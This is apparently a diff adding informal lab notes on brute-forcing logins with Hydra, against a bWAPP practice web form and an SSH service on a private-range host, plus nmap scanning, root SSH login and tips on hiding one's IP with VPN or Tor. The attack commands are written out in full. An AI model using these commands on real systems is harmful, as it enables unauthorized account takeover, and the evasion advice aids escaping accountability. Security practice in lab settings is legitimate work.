@@ -1,0 +1,26 @@
+bwapp/login(owasp)
+view page source or view brupsuite the field we wanted to bruteforce example login= password=
+
+hydra 192.168.1.11 http-form-post "/bWAPP/login.php:login=^USER^&password=^PASS^&form=submit:Invalid" -L user.txt -P pass.txt
+
+           |                 |
+                          
+   ping -4 (eg. google.com)   or http-get-form
+    nslookup google.com
+
+
+
+#hydra SSH attack
+1.nmap 192.168.1.11 -F ->output got 22/tcp open ssh
+2.hydra 192.168.1.11 ssh -t 4  (run 4 to 8 in parrallel if default 1 might stuck) -L user.txt -P pass.txt
+3.Manual login after success
+ssh username@192.168.1.11
+(If root is enabled and Hydra found its creds:)
+ssh root@192.168.1.11
+⚠️ Many modern Linux distros disable direct root SSH login for security — so you often brute-force a normal user, then escalate privileges.
+
+
+how to get ur ip untracked
+1.because ip using dhcp stil can be track with public ip address
+2.we can use vpn or TOR inside a VM
+anyway isp still gonna track u coz they have every log information if u do something illegal
